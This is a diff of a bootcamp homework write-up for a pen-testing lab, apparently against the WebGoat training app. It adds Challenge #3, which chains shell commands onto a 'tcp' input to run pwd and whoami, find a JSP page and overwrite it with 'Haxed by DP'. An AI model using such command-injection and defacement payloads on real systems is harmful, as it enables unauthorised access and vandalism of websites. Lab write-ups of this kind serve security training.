@@ -170,4 +170,14 @@ In this activity, you will assume the role of a pen tester hired by a bank to te
 
 #### Challenge #3
 
+Present Working Directory `tcp && pwd && whoami`
+
+![pwd](https://github.com/dmpeppin/BootCamp_Homework/blob/main/HW15%20Ch3.PNG)
+
+Locate webpage `tcp && cd / && find . -iname webgoat_challenge_guest.jsp`
+
+![page locator](https://github.com/dmpeppin/BootCamp_Homework/blob/main/HW15%20Ch3.PNG)
+
+Deface `tcp && echo "Haxed by DP" > webgoat_challenge_guest.jsp` note the overwrite rather than the append
+
 ![defaced](https://github.com/dmpeppin/BootCamp_Homework/blob/main/HW15%20Ch3.PNG)
